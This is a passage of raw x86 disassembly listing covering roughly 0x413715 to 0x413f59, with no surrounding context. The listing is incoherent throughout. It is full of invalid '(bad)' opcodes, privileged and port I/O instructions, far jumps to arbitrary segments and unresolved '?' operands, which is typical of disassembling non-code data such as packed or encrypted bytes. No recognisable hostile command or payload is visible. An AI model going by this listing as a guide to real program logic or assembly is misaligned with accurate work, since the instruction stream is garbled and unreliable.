  413715:	jbe    0x4136fd
  413717:	or     esi,ebx
  413719:	aas    
  41371a:	mov    esp,ebx
  41371c:	push   ebp
  41371d:	(bad)  
  41371e:	jmp    0x4136a4
  413720:	mov    eax,ds:0xa24cf51e
  413725:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413726:	fidivr WORD PTR [ebp+0x74ae5ab0]
  41372c:	dec    esp
  41372d:	mov    bl,0x37
  41372f:	imul   eax,edx,0x4e17770e
  413735:	and    edx,DWORD PTR [ebx+0x652ea502]
  41373b:	div    DWORD PTR [esi+0x75]
  41373e:	pop    eax
  41373f:	cmp    BYTE PTR [ebx-0xaffa61f],bl
  413745:	lock mov edi,0x2c99721
  41374b:	add    eax,0xedc83b83
  413750:	or     eax,0xbd076fbf
  413755:	cmp    ebx,DWORD PTR [ebp-0x61]
  413758:	sub    DWORD PTR [ecx],0x1468f8d4
  41375e:	mov    ecx,0xd9fbca3b
  413763:	xor    DWORD PTR [eax],eax
  413765:	xor    eax,0x13003bb
  41376a:	or     eax,0x9ca566be
  41376f:	cmp    BYTE PTR [eax-0x20f40401],ah
  413775:	pop    ebx
  413776:	mov    cl,0x4f
  413778:	inc    esi
  413779:	mov    ebx,0x4e521a9d
  41377e:	pop    ds
  41377f:	mov    BYTE PTR [edx+0x44],al
  413782:	rol    cl,cl
  413784:	(bad)  
  413785:	or     dl,BYTE PTR [ecx-0x6d6c8722]
  41378b:	mov    dl,0x3
  41378d:	pop    ebx
  41378e:	sbb    al,0x7a
  413790:	popf   
  413791:	sahf   
  413792:	push   ss
  413793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413794:	xor    DWORD PTR [ebx+0x2e78f52e],edx
  41379a:	loop   0x4137a3
  41379c:	ss (bad) 
  41379e:	bound  ebp,QWORD PTR [ebx]
  4137a0:	jo     0x413777
  4137a2:	pop    ds
  4137a3:	lock xchg BYTE PTR [edi+0x4c],bh
  4137a7:	xor    edi,ebp
  4137a9:	arpl   WORD PTR [eax+0x233a95c2],cx
  4137af:	mov    ebp,ecx
  4137b1:	ins    BYTE PTR es:[edi],dx
  4137b2:	out    dx,eax
  4137b3:	mov    bh,0xc4
  4137b5:	sbb    ecx,DWORD PTR [edx-0x5b9e6e39]
  4137bb:	inc    ebp
  4137bc:	test   bl,0xe6
  4137bf:	push   0x4f
  4137c1:	int    0x44
  4137c3:	push   ss
  4137c4:	jb     0x413769
  4137c6:	cmp    ebx,DWORD PTR [ebp-0x1c]
  4137c9:	dec    esp
  4137ca:	cli    
  4137cb:	lods   al,BYTE PTR ds:[esi]
  4137cc:	pop    eax
  4137cd:	ror    DWORD PTR [esi+0x9],0xe5
  4137d1:	ret    0x3838
  4137d4:	gs aad 0xca
  4137d7:	dec    ebp
  4137d8:	stos   BYTE PTR es:[edi],al
  4137d9:	xchg   BYTE PTR [ebx],al
  4137db:	xor    ebx,DWORD PTR [eax+0x42]
  4137de:	aas    
  4137df:	mov    dh,0xa9
  4137e1:	lods   eax,DWORD PTR ds:[esi]
  4137e2:	popf   
  4137e3:	arpl   bp,dx
  4137e5:	inc    esi
  4137e6:	cmc    
  4137e7:	pop    esi
  4137e8:	xor    al,0xad
  4137ea:	sbb    al,0x68
  4137ec:	rcl    ah,0xe9
  4137ef:	cld    
  4137f0:	outs   dx,DWORD PTR ds:[esi]
  4137f1:	add    BYTE PTR [edi+0x60],bl
  4137f4:	test   BYTE PTR [eax-0x3d7d0bf9],0x37
  4137fb:	jge    0x4137e4
  4137fd:	sti    
  4137fe:	sub    al,0x48
  413800:	mov    BYTE PTR [edi+0x7fc3a483],bh
  413806:	xchg   edx,eax
  413807:	cs push 0x4f197d34
  41380d:	fldcw  WORD PTR [esi-0x498ca51]
  413813:	push   ecx
  413814:	call   0xb499:0xba1a6c28
  41381b:	pop    esi
  41381c:	cmp    al,dh
  41381e:	sbb    DWORD PTR [eax+0x38],ebp
  413821:	and    esi,ecx
  413823:	push   ss
  413824:	test   eax,0xe68c4fca
  413829:	sbb    al,0xec
  41382b:	mov    edx,0xb9eda30a
  413830:	popa   
  413831:	adc    DWORD PTR [eax+0x59793fd8],ecx
  413837:	imul   ebp,DWORD PTR [edx],0xffffffda
  41383a:	sub    al,0xfd
  41383c:	mov    ah,0x75
  41383e:	fmul   QWORD PTR [ecx]
  413840:	xlat   BYTE PTR ds:[ebx]
  413841:	je     0x4137e6
  413843:	daa    
  413844:	pop    ss
  413845:	pop    edx
  413846:	dec    ebp
  413847:	or     edi,DWORD PTR [edx+0x38]
  41384a:	test   al,0x9e
  41384c:	xor    eax,0xc491d6b0
  413851:	xor    DWORD PTR [edi],0x682ea2cc
  413857:	mov    ch,0x3a
  413859:	fbld   TBYTE PTR [ebx+eax*4]
  41385c:	jmp    0xa462:0xb6b5517d
  413863:	sub    BYTE PTR [ebx-0xe],al
  413866:	xchg   esi,eax
  413867:	cs xor al,0xf
  41386a:	adc    eax,0xd26f7d67
  41386f:	cs das 
  413871:	call   0x9f91dee4
  413876:	or     DWORD PTR ds:0x2696cd1c,edx
  41387c:	es push cs
  41387e:	pop    esi
  41387f:	xor    bl,BYTE PTR [ecx+0x8d7583b]
  413885:	jle    0x413817
  413887:	lahf   
  413888:	leave  
  413889:	adc    BYTE PTR [ebp+0x20b6e4e5],0x1a
  413890:	sub    eax,0x713dddad
  413895:	call   0xbc84:0x52e147a9
  41389c:	adc    BYTE PTR [ebp+edx*1-0x78],ch
  4138a0:	adc    eax,0xcd31bb8a
  4138a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138a6:	xchg   DWORD PTR [esi+0x710f6982],ebx
  4138ac:	push   ss
  4138ad:	xchg   ecx,eax
  4138ae:	das    
  4138af:	jg     0x413838
  4138b1:	inc    ebx
  4138b2:	mov    bl,0x6a
  4138b4:	aad    0x55
  4138b6:	dec    edx
  4138b7:	add    ebp,DWORD PTR [edi]
  4138b9:	push   eax
  4138ba:	or     eax,0x13b8058d
  4138bf:	xchg   ch,cl
  4138c1:	shl    DWORD PTR [esi+edi*8+0x702d6f2b],0xcf
  4138c9:	aaa    
  4138ca:	outs   dx,DWORD PTR ds:[esi]
  4138cb:	push   edx
  4138cc:	scas   eax,DWORD PTR es:[edi]
  4138cd:	cdq    
  4138ce:	les    esi,FWORD PTR [ecx]
  4138d0:	iret   
  4138d1:	mov    esi,DWORD PTR [edi+0x7d5fe120]
  4138d7:	out    dx,al
  4138d8:	jmp    0xef58:0xc497ebc4
  4138df:	jmp    0xd243:0x14f494
  4138e6:	xchg   ebx,eax
  4138e7:	push   ecx
  4138e8:	mov    WORD PTR [ecx-0x2b],?
  4138eb:	mov    ?,esp
  4138ed:	or     DWORD PTR ds:0xc5d83d8c,edx
  4138f3:	(bad)  
  4138f4:	fidivr DWORD PTR [ebp-0x22]
  4138f7:	adc    edi,ebp
  4138f9:	mov    cr5,eax
  4138fc:	(bad)  
  4138fd:	cmp    dh,BYTE PTR [ecx+0x6652a7f8]
  413903:	sahf   
  413904:	inc    edi
  413905:	xchg   BYTE PTR [esi],cl
  413907:	inc    edi
  413908:	xor    al,0x63
  41390a:	mov    ebp,0xb352ad17
  41390f:	pop    ds
  413910:	add    eax,0xe309138e
  413915:	xlat   BYTE PTR ds:[ebx]
  413916:	test   BYTE PTR [ecx-0x3ba40785],0x10
  41391d:	mov    dh,0x57
  41391f:	aam    0xa3
  413921:	repnz out 0xe5,eax
  413924:	pop    edx
  413925:	and    edi,DWORD PTR [ecx]
  413927:	scas   eax,DWORD PTR es:[edi]
  413928:	jno    0x4138fc
  41392a:	and    esi,DWORD PTR [ebx+0x1ce0e1fa]
  413930:	mov    ds:0x3b405c7d,al
  413935:	or     cl,BYTE PTR [ecx+eiz*1]
  413938:	loopne 0x413910
  41393a:	cmp    al,0x53
  41393c:	cmp    BYTE PTR [edi+0x7f],dl
  41393f:	add    ah,al
  413941:	dec    ebp
  413942:	sub    al,0x1b
  413944:	push   ss
  413945:	push   0xe55356ea
  41394a:	rcl    BYTE PTR [ebx],1
  41394c:	sbb    DWORD PTR [ecx+0x16],esp
  41394f:	pop    ds
  413950:	add    eax,0x80a43c5d
  413955:	pop    eax
  413956:	cmp    ebx,esi
  413958:	push   edx
  413959:	(bad)  
  41395a:	frstor [ecx+0x42]
  41395d:	mov    dl,0xb2
  41395f:	and    dl,bh
  413961:	cli    
  413962:	loopne 0x4139bb
  413964:	dec    ecx
  413965:	bound  edi,QWORD PTR [esi+0x50]
  413968:	add    bh,bl
  41396a:	daa    
  41396b:	loope  0x4139a0
  41396d:	sbb    DWORD PTR [esi],ecx
  41396f:	sub    DWORD PTR [ebp+0x5b6e9eec],0xffffff85
  413976:	xchg   ebp,eax
  413977:	aaa    
  413978:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413979:	add    eax,DWORD PTR [ecx+0x3e]
  41397c:	and    edx,DWORD PTR [ebx+eiz*1-0x2c]
  413980:	xor    eax,0xde87ba63
  413985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413986:	fmul   st(6),st
  413988:	ins    BYTE PTR es:[edi],dx
  413989:	(bad)  
  41398a:	outs   dx,BYTE PTR ds:[esi]
  41398b:	retf   0xa6f
  41398e:	inc    esp
  41398f:	je     0x4139c4
  413991:	adc    ch,BYTE PTR [edi+ecx*1+0x6]
  413995:	icebp  
  413996:	push   cs
  413997:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413998:	and    al,0xb7
  41399a:	test   al,0xd1
  41399c:	test   eax,0xdd12b511
  4139a1:	retf   
  4139a2:	xor    al,0x7e
  4139a4:	push   esp
  4139a5:	ins    BYTE PTR es:[edi],dx
  4139a6:	inc    edx
  4139a7:	push   es
  4139a8:	in     eax,dx
  4139a9:	xchg   ebp,eax
  4139aa:	sbb    al,0x37
  4139ac:	add    edi,DWORD PTR [esp+edi*4]
  4139af:	(bad)  
  4139b1:	mov    al,ds:0x7d8823fc
  4139b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139b7:	xchg   ebx,edi
  4139b9:	mov    edi,DWORD PTR [eax+0x7c]
  4139bc:	pop    edx
  4139bd:	xor    ecx,DWORD PTR ds:0xe650c3a4
  4139c3:	mov    eax,0xbf57ca7c
  4139c8:	mov    ecx,0x406f2b43
  4139cd:	lahf   
  4139ce:	push   edx
  4139cf:	fsub   st,st(5)
  4139d1:	lock jnp 0x4139a5
  4139d4:	jmp    0xe73d:0x5dfe0eff
  4139db:	mov    BYTE PTR [esi-0x505da17e],ah
  4139e1:	inc    ebp
  4139e2:	(bad)
  4139e5:	jne    0x4139dc
  4139e7:	pop    esp
  4139e8:	add    DWORD PTR [edi],ebp
  4139ea:	mov    dl,0xfb
  4139ec:	jbe    0x413a1e
  4139ee:	jmp    0xbf39711b
  4139f3:	push   edi
  4139f4:	push   ecx
  4139f5:	test   dh,dl
  4139f7:	ins    DWORD PTR es:[edi],dx
  4139f8:	mov    al,ds:0x174e8b96
  4139fd:	in     eax,0x84
  4139ff:	imul   esi,DWORD PTR [ecx-0x16a4de6f],0x55
  413a06:	sar    ch,cl
  413a08:	(bad)  
  413a09:	push   esi
  413a0a:	or     BYTE PTR [ecx],bh
  413a0c:	mov    cs,WORD PTR [edi]
  413a0e:	xor    eax,0x572643b8
  413a13:	call   0xd57dd723
  413a18:	adc    al,0x71
  413a1a:	inc    esp
  413a1b:	jno    0x4139c5
  413a1d:	mov    ds:0x5d52cc6a,eax
  413a22:	sar    DWORD PTR [edx+0x179a655f],cl
  413a28:	in     eax,0xd
  413a2a:	xor    BYTE PTR [eax-0x6f02b315],cl
  413a30:	pop    ebx
  413a31:	iret   
  413a32:	xor    ecx,DWORD PTR [esi+0x31]
  413a35:	sbb    al,0x91
  413a37:	repnz loope 0x4139e1
  413a3a:	mov    ds:0xe5f8cef1,al
  413a3f:	popa   
  413a40:	in     al,dx
  413a41:	frstorw ss:[edx]
  413a45:	or     bh,BYTE PTR [edi+ebp*1-0x735a4eac]
  413a4c:	and    dl,BYTE PTR [edx+0x20]
  413a4f:	enter  0xe567,0xd4
  413a53:	pop    edi
  413a54:	and    bl,BYTE PTR [ebp+0x38]
  413a57:	xor    bh,bl
  413a59:	jg     0x413a64
  413a5b:	outs   dx,DWORD PTR ds:[esi]
  413a5c:	imul   BYTE PTR [ebp+0x5a046b86]
  413a62:	mov    dh,0x5b
  413a64:	xchg   esi,eax
  413a65:	sbb    dh,bh
  413a67:	add    al,0x9a
  413a69:	cmp    dl,dh
  413a6b:	xor    ah,BYTE PTR [ecx+0x427afc14]
  413a71:	(bad)  
  413a72:	scas   al,BYTE PTR es:[edi]
  413a73:	jbe    0x413a13
  413a75:	nop
  413a76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a77:	and    eax,0xadb672b2
  413a7c:	dec    ebx
  413a7d:	inc    esp
  413a7e:	(bad)  
  413a7f:	out    0x81,eax
  413a81:	test   DWORD PTR [edx-0x50],ebp
  413a84:	lock and al,0x36
  413a87:	xor    al,0x9f
  413a89:	mov    ebp,0x4f96dc7d
  413a8e:	add    DWORD PTR ds:0x4c03e187,edx
  413a94:	xchg   ebp,eax
  413a95:	xchg   DWORD PTR [ebx],esp
  413a97:	test   ebx,0x9913f7df
  413a9d:	jo     0x413a8f
  413a9f:	sub    eax,0x186408b7
  413aa4:	fld    TBYTE PTR [ebp+0x6eeb7274]
  413aaa:	test   BYTE PTR [eax+0x22],ah
  413aad:	mov    dh,0xe3
  413aaf:	fdivr  QWORD PTR fs:[edx+0x40b48df9]
  413ab6:	pop    ebp
  413ab7:	jl     0x413ac7
  413ab9:	sub    al,0x2c
  413abb:	jmp    0xce091a68
  413ac0:	jl     0x413a4f
  413ac2:	enter  0xf57c,0x31
  413ac6:	ret    0x9fc8
  413ac9:	cmp    BYTE PTR [edx],al
  413acb:	out    dx,eax
  413acc:	shl    DWORD PTR [ebx+0x69fb4a42],0x21
  413ad3:	jae    0x413a73
  413ad5:	retf   0x8ff
  413ad8:	mov    dh,0x12
  413ada:	sbb    BYTE PTR [eax],dl
  413adc:	xchg   esi,eax
  413add:	add    al,0x23
  413adf:	inc    ebp
  413ae0:	mov    cl,0x95
  413ae2:	jmp    0x413aa1
  413ae4:	sbb    DWORD PTR [ebp+0x66],eax
  413ae7:	xor    edi,DWORD PTR [ebx+0x7c11e54]
  413aed:	mov    esi,0xe131abd1
  413af2:	dec    esp
  413af3:	int3   
  413af4:	xor    al,0x43
  413af6:	mov    dh,0xf4
  413af8:	ret    
  413af9:	dec    esp
  413afa:	dec    eax
  413afb:	std    
  413afc:	xchg   ebx,eax
  413afd:	jno    0x413ac5
  413aff:	adc    al,0xc3
  413b01:	arpl   WORD PTR [edx],bx
  413b03:	mov    edi,0xa0e9b574
  413b08:	xchg   BYTE PTR [edx],cl
  413b0a:	or     BYTE PTR [ecx],cl
  413b0c:	sti    
  413b0d:	inc    ecx
  413b0e:	sbb    al,0x6e
  413b10:	div    DWORD PTR [edi-0x11]
  413b13:	xchg   esp,eax
  413b14:	sbb    al,0x5d
  413b16:	xor    DWORD PTR [edi+0x40],eax
  413b19:	pop    ebx
  413b1a:	in     al,0x86
  413b1c:	lock mov ds:0xe33526c5,al
  413b22:	mov    ebx,0x18a18d1
  413b28:	mov    cl,0x48
  413b2a:	out    0xb1,al
  413b2c:	jo     0x413ac9
  413b2e:	stos   DWORD PTR es:[edi],eax
  413b2f:	sub    al,0x7f
  413b31:	js     0x413b46
  413b33:	inc    esp
  413b34:	add    al,0x8e
  413b36:	and    cl,BYTE PTR [ebp-0x5]
  413b39:	stos   DWORD PTR es:[edi],eax
  413b3a:	xlat   BYTE PTR ds:[ebx]
  413b3b:	and    dl,BYTE PTR [edi-0xd]
  413b3e:	in     eax,0x96
  413b40:	std    
  413b41:	mov    WORD PTR [esi+esi*8-0x4d],fs
  413b45:	sar    BYTE PTR [ebx],1
  413b47:	jle    0x413aed
  413b49:	ds mov dl,0x50
  413b4c:	inc    esp
  413b4d:	emms   
  413b4f:	jb     0x413aec
  413b51:	das    
  413b52:	mov    cl,0x5a
  413b54:	jae    0x413aff
  413b56:	dec    esi
  413b57:	(bad)  
  413b58:	cdq    
  413b59:	test   DWORD PTR [edi-0x3bbc78be],eax
  413b5f:	scas   eax,DWORD PTR es:[edi]
  413b60:	sbb    esp,DWORD PTR [ebp+0x49]
  413b63:	dec    ebx
  413b64:	jge    0x413b6a
  413b66:	mov    ebx,0xe291d7c8
  413b6b:	mov    esp,0x1e3b95b7
  413b70:	stos   BYTE PTR es:[edi],al
  413b71:	sti    
  413b72:	pop    edi
  413b73:	jb     0x413bb4
  413b75:	xchg   edx,eax
  413b76:	xor    DWORD PTR [eax-0x6e27f933],0x42b0699b
  413b80:	ja     0x413b56
  413b82:	sar    BYTE PTR [eax],1
  413b84:	ffreep st(0)
  413b86:	sbb    DWORD PTR [edx-0x2e],ebx
  413b89:	push   ecx
  413b8a:	cwde   
  413b8b:	jae    0x413bbd
  413b8d:	mov    dl,0x21
  413b8f:	xchg   edi,eax
  413b90:	sub    ebp,ecx
  413b92:	mov    dh,0x25
  413b94:	mov    esi,0xf3681955
  413b99:	test   al,0xe1
  413b9b:	(bad)  
  413b9c:	es cmp al,0xe2
  413b9f:	outs   dx,BYTE PTR ds:[esi]
  413ba0:	mov    ebp,0x4088d1bf
  413ba5:	inc    edx
  413ba6:	fwait
  413ba7:	(bad)  
  413ba8:	out    0xa9,eax
  413baa:	es jae 0x413bd1
  413bad:	mov    edi,0x7ac710ae
  413bb2:	ror    DWORD PTR [eax+0x2f],0x33
  413bb6:	aaa    
  413bb7:	(bad)  
  413bb8:	mov    bh,0x67
  413bba:	adc    bl,ch
  413bbc:	and    al,0xeb
  413bbe:	pop    edx
  413bbf:	bound  ebp,QWORD PTR [ebp-0x19]
  413bc2:	or     eax,0xb97fc4ca
  413bc7:	(bad)  
  413bc9:	inc    edi
  413bca:	pop    esp
  413bcb:	mov    gs,WORD PTR [edi]
  413bcd:	jo     0x413be4
  413bcf:	es or  eax,0x6f123724
  413bd5:	loope  0x413ba7
  413bd7:	in     al,0xd4
  413bd9:	dec    ecx
  413bda:	add    dh,bl
  413bdc:	icebp  
  413bdd:	mov    ds:0xa25ac45a,eax
  413be2:	dec    ecx
  413be3:	adc    al,0xa0
  413be5:	or     eax,DWORD PTR [ecx+0x6a309607]
  413beb:	mov    al,ds:0xff1803d0
  413bf0:	out    0x2a,eax
  413bf2:	and    DWORD PTR [edx],eax
  413bf4:	aad    0x32
  413bf6:	dec    ebp
  413bf7:	iret   
  413bf8:	loope  0x413c27
  413bfa:	cs jmp 0x426a546a
  413c00:	fs into 
  413c02:	and    DWORD PTR cs:[edx-0x7c949c53],ebx
  413c09:	jmp    0x7ccc:0xfd91bf78
  413c10:	or     eax,0x69eb7d16
  413c15:	adc    BYTE PTR [eax+0x1f],dh
  413c18:	inc    eax
  413c19:	bound  ecx,QWORD PTR [edx+0x4f]
  413c1c:	cmp    al,0x20
  413c1e:	icebp  
  413c1f:	int3   
  413c20:	in     al,dx
  413c21:	fwait
  413c22:	(bad)  
  413c23:	outs   dx,DWORD PTR ds:[esi]
  413c24:	sti    
  413c25:	aaa    
  413c26:	or     ch,BYTE PTR [esi+0x67cd5ea3]
  413c2c:	arpl   WORD PTR [edi+edi*8-0x42],si
  413c30:	or     esp,edi
  413c32:	jecxz  0x413c83
  413c34:	xchg   ebp,eax
  413c35:	data16 xchg BYTE PTR [edi-0x2b],cl
  413c39:	sbb    BYTE PTR [edi+ebp*1-0xafdd2e5],bl
  413c40:	shl    BYTE PTR [ecx],1
  413c42:	fxam   
  413c44:	xchg   esp,edi
  413c46:	mov    cl,BYTE PTR [edi+0x35]
  413c49:	sub    al,0xcd
  413c4b:	popf   
  413c4c:	mov    edx,es
  413c4e:	xor    cl,BYTE PTR [edx-0x78]
  413c51:	leave  
  413c52:	push   es
  413c53:	ins    BYTE PTR es:[edi],dx
  413c54:	loop   0x413c61
  413c56:	and    eax,0xb56f0838
  413c5b:	out    0xd4,eax
  413c5d:	add    ch,BYTE PTR [eax-0xe]
  413c60:	addr16 sti 
  413c62:	add    al,0x14
  413c64:	push   esp
  413c65:	fs xchg esi,eax
  413c67:	(bad)  [edi+0x5c7b6baa]
  413c6d:	xor    al,dh
  413c6f:	out    0xb1,eax
  413c71:	adc    eax,0x5549aa80
  413c76:	xor    eax,0xf18f9a83
  413c7b:	(bad)  
  413c7c:	lods   eax,DWORD PTR ds:[esi]
  413c7d:	arpl   sp,bp
  413c7f:	pop    DWORD PTR [edi+edx*4-0x2f]
  413c83:	adc    BYTE PTR [edi+0x139c07e5],0x6b
  413c8a:	data16 fld st(2)
  413c8d:	(bad)  
  413c8e:	and    eax,0x7562c92d
  413c93:	xchg   ebx,eax
  413c94:	mov    DWORD PTR [eax],0x0
	...
  413d12:	add    BYTE PTR [eax],al
  413d14:	push   0x7cbe6434
  413d19:	(bad)  
  413d1a:	cli    
  413d1b:	div    BYTE PTR [ebx+0x39d4d49d]
  413d21:	dec    eax
  413d22:	hlt    
  413d23:	xchg   ecx,eax
  413d24:	sbb    ah,ah
  413d26:	add    BYTE PTR [eax],al
  413d28:	imul   eax,DWORD PTR [edi],0xf9190000
  413d2e:	(bad)  
  413d2f:	dec    esp
  413d30:	mov    ah,0x5c
  413d32:	scas   eax,DWORD PTR es:[edi]
  413d33:	jae    0x413d45
  413d35:	stos   BYTE PTR es:[edi],al
  413d36:	out    0xe0,eax
  413d38:	xor    ecx,DWORD PTR [ecx]
  413d3a:	out    dx,al
  413d3b:	repz test BYTE PTR [edi],ch
  413d3e:	xor    eax,0x367e6fe7
  413d43:	loopne 0x413cce
  413d45:	jns    0x413ce7
  413d47:	pop    edi
  413d48:	dec    edx
  413d49:	jo     0x413d3d
  413d4b:	fst    DWORD PTR [eax-0x7e]
  413d4e:	lods   al,BYTE PTR ds:[esi]
  413d4f:	sbb    eax,0x19707d6d
  413d54:	mov    eax,ds:0xb22a000
  413d59:	sbb    al,0xa
  413d5b:	out    0x3e,eax
  413d5d:	adc    al,BYTE PTR [ebp-0x3d73b03e]
  413d63:	int    0x91
  413d65:	pop    ebx
  413d66:	cmp    BYTE PTR [ebp+0x5f8db14f],dh
  413d6c:	(bad)  
  413d6d:	jno    0x413d6a
  413d6f:	cs in  eax,0xb4
  413d72:	jmp    0x1415:0x7d45c33f
  413d79:	xchg   dl,dl
  413d7b:	call   edx
  413d7d:	mov    al,0x56
  413d7f:	outs   dx,DWORD PTR ds:[esi]
  413d80:	fwait
  413d81:	xchg   esp,eax
  413d82:	(bad)  
  413d83:	pop    ebp
  413d84:	mov    eax,DWORD PTR [eax+eax*1-0xb]
  413d88:	adc    cl,cl
  413d8a:	ret    
  413d8b:	push   ecx
  413d8c:	sub    ebx,esi
  413d8e:	add    al,BYTE PTR [ebx]
  413d90:	mov    edx,0x7caa479e
  413d95:	inc    ecx
  413d96:	push   es
  413d97:	sbb    BYTE PTR [ecx-0x34],0x3
  413d9b:	or     eax,0x5eb8fe13
  413da0:	mov    ah,0x1c
  413da2:	xor    BYTE PTR [ecx-0x32d379c2],0x97
  413da9:	add    BYTE PTR [edi+0xdb2ed6e],ch
  413daf:	xlat   BYTE PTR ds:[ebx]
  413db0:	mov    ah,0xab
  413db2:	and    edx,DWORD PTR [eax]
  413db4:	ins    BYTE PTR es:[edi],dx
  413db5:	mov    dh,0x2c
  413db7:	test   al,0x9a
  413db9:	and    ecx,edx
  413dbb:	mov    al,ds:0x1706644b
  413dc0:	ja     0x413d63
  413dc2:	sub    BYTE PTR [si],al
  413dc5:	add    ah,ch
  413dc7:	mov    bl,0xa1
  413dc9:	and    BYTE PTR [ecx+0x1c9b4cf0],al
  413dcf:	pop    ebx
  413dd0:	icebp  
  413dd1:	mov    eax,0x311fe69
  413dd6:	push   esi
  413dd7:	jnp    0x413d59
  413dd9:	adc    BYTE PTR [esi+edi*8-0x10],bh
  413ddd:	gs (bad) 
  413ddf:	out    dx,eax
  413de0:	push   edi
  413de1:	jle    0x413da6
  413de3:	sub    al,0xe3
  413de5:	outs   dx,BYTE PTR ds:[esi]
  413de6:	std    
  413de7:	mov    ebx,DWORD PTR [bp+di+0x1fff]
  413dec:	jnp    0x413e1e
  413dee:	add    ecx,ebp
  413df0:	stc    
  413df1:	mov    ebp,DWORD PTR [edx]
  413df3:	ds mov cl,0x53
  413df6:	mov    al,0xc0
  413df8:	push   es
  413df9:	adc    BYTE PTR [ebx+ecx*4],al
  413dfc:	cmp    al,0x3
  413dfe:	addr16 jnp 0x413e39
  413e01:	out    dx,al
  413e02:	mov    al,0xd4
  413e04:	jnp    0x413e00
  413e06:	enter  0x4995,0xc7
  413e0a:	jle    0x413dbb
  413e0c:	lea    esi,[esi+0x11]
  413e0f:	sti    
  413e10:	pop    ds
  413e11:	inc    esi
  413e12:	cdq    
  413e13:	add    ah,BYTE PTR [eax-0x44]
  413e16:	dec    edx
  413e17:	loopne 0x413e7a
  413e19:	jp     0x413dee
  413e1b:	pop    ebx
  413e1c:	cld    
  413e1d:	ror    dl,1
  413e1f:	ins    BYTE PTR es:[edi],dx
  413e20:	xor    eax,0x76a64724
  413e25:	loop   0x413e5c
  413e27:	or     eax,esi
  413e29:	test   BYTE PTR [ebx-0x19],ah
  413e2c:	add    al,0xdd
  413e2e:	cld    
  413e2f:	dec    esi
  413e30:	out    0xcb,eax
  413e32:	xor    ah,BYTE PTR [ebx-0x415c619f]
  413e38:	out    dx,eax
  413e39:	add    eax,0x5b30be00
  413e3e:	es push 0xffffffac
  413e41:	mov    fs,WORD PTR [edi+0x5d]
  413e44:	mov    WORD PTR [ebx-0x6fcd925],?
  413e4a:	inc    ebp
  413e4b:	push   edx
  413e4c:	daa    
  413e4d:	outs   dx,BYTE PTR ds:[esi]
  413e4e:	(bad)  [edi-0x40]
  413e51:	jmp    0x7210:0x79abe326
  413e58:	lds    esp,FWORD PTR [edx-0x60da2634]
  413e5e:	and    edi,ecx
  413e60:	lock sbb BYTE PTR [edi],al
  413e63:	fs popa 
  413e65:	push   ss
  413e66:	test   DWORD PTR [ebx],edi
  413e68:	inc    esi
  413e69:	rcr    BYTE PTR [ecx-0x46],0x72
  413e6d:	jnp    0x413df1
  413e6f:	arpl   WORD PTR [esi],di
  413e71:	out    dx,al
  413e72:	loope  0x413e65
  413e74:	mov    esp,0x5aeac200
  413e79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e7a:	fwait
  413e7b:	sar    BYTE PTR [ebp+0x65],0x81
  413e7f:	sbb    eax,0x7389a625
  413e84:	or     eax,esi
  413e86:	xor    eax,0x21f588eb
  413e8c:	cmp    ah,bh
  413e8e:	push   cs
  413e8f:	ja     0x413e14
  413e91:	rcr    dl,1
  413e93:	mov    es,WORD PTR [esi+0x4e]
  413e96:	sahf   
  413e97:	out    0xd9,eax
  413e99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e9a:	mov    cl,BYTE PTR [edi]
  413e9c:	fadd   st,st(0)
  413e9e:	out    dx,al
  413e9f:	fdivr  QWORD PTR [esi-0x2d]
  413ea2:	dec    eax
  413ea3:	mov    dl,0x38
  413ea5:	mov    ch,0x51
  413ea7:	mov    ch,0x79
  413ea9:	mov    bl,0xa0
  413eab:	(bad)  
  413eac:	mov    bl,0xbc
  413eae:	pop    ds
  413eaf:	mov    edx,0x7bf39f68
  413eb4:	xchg   DWORD PTR [edx+0x55],ebx
  413eb7:	inc    ebx
  413eb8:	cmp    DWORD PTR [esi],eax
  413eba:	jl     0x413ef0
  413ebc:	inc    esp
  413ebd:	mov    esp,0xff55cdf8
  413ec2:	or     ebp,DWORD PTR [edx+0x12]
  413ec5:	add    BYTE PTR [edx+ebp*4+0x7c],0xb4
  413eca:	pop    ebp
  413ecb:	iret   
  413ecc:	push   cs
  413ecd:	mov    cs,WORD PTR [esi+0x72]
  413ed0:	adc    DWORD PTR [ecx-0x63248020],0xf20e3232
  413eda:	mov    esp,edi
  413edc:	fild   QWORD PTR [edx+0x47e20980]
  413ee2:	mov    bh,0x99
  413ee4:	fmul   DWORD PTR [ebp+0x60]
  413ee7:	cmc    
  413ee8:	pop    ss
  413ee9:	cmc    
  413eea:	or     DWORD PTR [edx+0x47cec4be],edx
  413ef0:	or     bl,BYTE PTR [edi+0x26]
  413ef3:	push   0xffffffbb
  413ef5:	mov    WORD PTR [esi+0x603c536f],?
  413efb:	dec    ebx
  413efc:	mov    ds:0xf09b8a03,eax
  413f01:	int3   
  413f02:	pop    edi
  413f03:	std    
  413f04:	retf   
  413f05:	adc    edx,ebx
  413f07:	into   
  413f08:	enter  0x8c4b,0x1e
  413f0c:	or     DWORD PTR [edi],edi
  413f0e:	xchg   ebx,edi
  413f10:	jmp    0xa6:0x17fdcccc
  413f17:	push   ebp
  413f18:	mov    dh,0xc3
  413f1a:	dec    esp
  413f1b:	icebp  
  413f1c:	cmp    ecx,DWORD PTR ds:0xe6378348
  413f22:	lea    esi,[esi]
  413f24:	sbb    esp,DWORD PTR [ecx]
  413f26:	pop    ebx
  413f27:	adc    eax,0x2fe0fedf
  413f2c:	pusha  
  413f2d:	jb     0x413ef9
  413f2f:	cmp    edx,DWORD PTR [ebx-0x752fd13e]
  413f35:	std    
  413f36:	add    DWORD PTR [edx+ebx*8-0x29],ecx
  413f3a:	push   ds
  413f3b:	fdivr  DWORD PTR [ebp+ecx*4-0x6853b691]
  413f42:	or     eax,edx
  413f44:	js     0x413f30
  413f46:	mov    dh,0xce
  413f48:	test   eax,0x917e677a
  413f4d:	sbb    DWORD PTR [ebp-0x6e83e7a0],0x4a12a59f
  413f57:	mov    cl,0xcc
  413f59:	jmp    0xe0057b72
